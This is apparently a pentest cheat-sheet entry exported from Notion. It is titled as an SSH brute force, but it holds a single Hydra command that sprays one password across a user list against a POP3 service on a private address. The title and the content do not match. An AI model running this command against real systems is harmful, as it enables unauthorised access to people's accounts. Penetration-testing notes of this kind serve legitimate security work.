# Hydra Brute Force SSH

OS: Linux
Description: POP3 brute force
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: pop3 (https://www.notion.so/pop3-1444c8e523768094b845e25718ebd32c?pvs=21)

```jsx
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```